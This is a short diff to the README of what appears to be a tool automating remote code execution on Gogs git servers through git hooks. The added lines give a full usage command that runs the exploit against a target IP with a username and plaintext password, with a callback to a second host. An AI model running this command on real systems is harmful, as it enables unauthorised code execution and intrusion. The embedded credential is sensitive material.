@@ -1,3 +1,8 @@
+gogs 0.12.9
+sudo git config --global user.email "you@example.com"
+sudo git config --global user.name "Your Name"
+sudo python3 ./gogs.py -s 192.168.200.224:8000 -u jane -p 'svc-dev2022@@@!;P;4SSw0Rd' -t false -r 192.168.45.233:80
+
 # Gogs Remote Code Execution
 Tool to automate code execution on the server running Gogs git service.  
 Inspired from: https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce
